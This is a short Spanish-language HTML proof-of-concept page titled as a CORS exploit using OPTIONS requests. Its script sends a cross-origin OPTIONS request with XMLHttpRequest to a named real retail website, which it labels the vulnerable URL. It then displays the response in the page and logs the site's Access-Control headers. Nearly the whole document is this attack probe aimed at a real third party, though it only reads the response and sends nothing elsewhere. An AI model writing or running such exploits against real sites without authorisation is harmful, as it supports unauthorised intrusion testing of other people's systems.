<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Explotación CORS con OPTIONS</title>
  </head>
  <body>
    <center>
      <h2>Explotación CORS con OPTIONS</h2>
      <h3>Prueba la configuración CORS</h3>
      <div id="demo">
        <button type="button" onclick="exploitOptions()">Ejecutar Exploit</button>
      </div>
    </center>

    <script>
      function exploitOptions() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            if (xhr.status === 200) {
              document.getElementById("demo").innerHTML = "Respuesta:<br>" + xhr.responseText;
            } else {
              document.getElementById("demo").innerHTML = "Error: " + xhr.status + " - " + xhr.statusText;
            }
            // Mostrar en consola algunos de los encabezados de CORS
            console.log("Access-Control-Allow-Origin:", xhr.getResponseHeader("Access-Control-Allow-Origin"));
            console.log("Access-Control-Allow-Methods:", xhr.getResponseHeader("Access-Control-Allow-Methods"));
            console.log("Access-Control-Allow-Headers:", xhr.getResponseHeader("Access-Control-Allow-Headers"));
          }
        };

        xhr.onerror = function() {
          console.error("Error de red o problema CORS");
        };

        // Se envía una solicitud OPTIONS a la URL vulnerable
        xhr.open(
          "OPTIONS",
          "https://www.jdsports.es/?utm_source=google&utm_medium=cpc&utm_campaign=es_brand_em&gad_source=1&gclid=CjwKCAiAnpy9BhAkEiwA-P8N4jxNZxSvBYe9xGNhS-XVxZEJoZpQsUdRS8WuV9zdjwez-lz4a-cYlxoCPvcQAvD_BwE",
          true
        );

        xhr.send();
      }
    </script>
  </body>
</html>
